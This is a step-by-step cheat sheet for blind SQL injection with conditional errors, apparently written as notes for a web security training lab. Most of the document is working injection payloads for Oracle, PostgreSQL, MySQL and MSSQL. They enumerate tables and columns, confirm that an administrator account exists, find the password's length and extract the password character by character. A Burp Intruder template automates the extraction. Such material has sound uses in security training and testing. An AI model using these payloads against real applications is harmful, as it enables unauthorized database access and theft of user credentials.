# Blind SQL Injection with Conditional Errors — Full Workflow

---

## What It Is

The app doesn't reflect query results and the page behavior doesn't change between true/false conditions — but it **does** show error pages. You exploit this by crafting a query that **triggers a database error when your condition is true** and runs silently when false.

Your signal: HTTP 500 (error) vs HTTP 200 (no error).

---

## Step 1: Identify the Injection Point

- Test with `'` — if you get a 500 or the app breaks, you're in.
- Test with `''` (two single quotes) — if it recovers, the input is being concatenated into SQL.
- Test with `'--` — if it recovers, the comment closes the rest of the query cleanly.

---

## Step 2: Build the Error Oracle

The core idea: use `CASE WHEN` to conditionally trigger a database error.

### Oracle DB
```
' AND (SELECT CASE WHEN (YOUR-CONDITION) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL)='a'--
```
- Condition true → `TO_CHAR(1/0)` → divide-by-zero → **500**
- Condition false → `'a'` → no error → **200**

### PostgreSQL
```
' AND (SELECT CASE WHEN (YOUR-CONDITION) THEN CAST(1/0 AS TEXT) ELSE 'a' END)='a'--
```

### MySQL
```
' AND (SELECT IF(YOUR-CONDITION,(SELECT table_name FROM information_schema.tables),1))--
```
> MySQL doesn't error on 1/0 (returns NULL). Use a subquery that returns multiple rows to force an error instead.

### MSSQL
```
' AND (SELECT CASE WHEN (YOUR-CONDITION) THEN 1/0 ELSE 1 END)=1--
```

**Verify your oracle works:**
```
# Should return 500 (true → error):
... CASE WHEN (1=1) THEN TO_CHAR(1/0) ...

# Should return 200 (false → no error):
... CASE WHEN (1=2) THEN TO_CHAR(1/0) ...
```

---

## Step 3: Enumerate Tables

Replace `YOUR-CONDITION` with real questions.

### Oracle
```
' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM all_tables WHERE table_name='USERS')=1 THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL)='a'--
```

### PostgreSQL
```
' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users')>0 THEN CAST(1/0 AS TEXT) ELSE 'a' END)='a'--
```

500 = table exists. 200 = doesn't exist.

---

## Step 4: Enumerate Columns

### Oracle
```
' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM all_tab_columns WHERE table_name='USERS' AND column_name='PASSWORD')=1 THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL)='a'--
```

### PostgreSQL
```
' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name='password')>0 THEN CAST(1/0 AS TEXT) ELSE 'a' END)='a'--
```

---

## Step 5: Confirm Target Row Exists

### Oracle
```
' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='administrator')=1 THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL)='a'--
```

500 = user exists.

---

## Step 6: Determine Password Length

```
' AND (SELECT CASE WHEN LENGTH(password)>10 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
```

Binary search: `>10`, `>20`, `>15`, etc. until you nail the exact length.

---

## Step 7: Extract Data Character by Character

### Oracle
```
' AND (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
```

### PostgreSQL
```
' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN CAST(1/0 AS TEXT) ELSE 'a' END FROM users WHERE username='administrator')='a'--
```

---

## Step 8: Automate with Burp Intruder

**Attack type:** Cluster Bomb

**Payload template (Oracle example):**
```
' AND (SELECT CASE WHEN (SUBSTR(password,§1§,1)='§a§') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
```

- **Payload 1:** Numbers 1–[password length] (positions)
- **Payload 2:** a-z, 0-9, A-Z (characters)

**Filter results:**
- Sort/filter by HTTP status code: **500 = hit**
- Sort hits by Payload 1 ascending → read Payload 2 in order → password

---

## DB-Specific Gotchas

### Oracle
- Every `SELECT` without a real table needs `FROM DUAL`
- Use `TO_CHAR(1/0)` not bare `1/0` — Oracle needs type consistency in `CASE` branches
- Table/column names in `all_tables` / `all_tab_columns` are **UPPERCASE**

### PostgreSQL
- `1/0` raises an error — but wrap in `CAST(... AS TEXT)` to ensure the expression is evaluated
- Uses `information_schema` (lowercase table names)

### MySQL
- `1/0` returns `NULL`, not an error — you can't use divide-by-zero as your oracle
- Alternative: use `(SELECT table_name FROM information_schema.tables)` — returns multiple rows → subquery error
- Or `EXP(710)` — numeric overflow

### MSSQL
- `1/0` raises "Divide by zero error" — works as oracle
- Uses `information_schema` like PostgreSQL

---

## Cookie / URL Injection Notes

When injecting into cookies or URL parameters:

| Char | Encoded |
|------|---------|
| `;`  | `%3B`   |
| `=`  | `%3D`   |
| `'`  | `%27`   |
| ` `  | `%20`   |

---

## Real-World Tips

- **When to use this:** You've confirmed injection but boolean-based doesn't work (no visible behavior change). Check if error vs no-error gives you a signal.
- **Stacking with time-based:** If errors are also suppressed (custom error pages that all look the same), fall back to time-based.
- **Error oracle reliability:** Test your oracle multiple times — some apps have intermittent 500s from other causes. Make sure your true/false signals are consistent.
- **Character limit in cookies:** If the cookie has a length limit, shorten the TrackingId value (use `x` instead of the original) to make room for your payload.

---

The mindset: no output, no behavior change → force errors → use error/no-error as your yes/no signal.
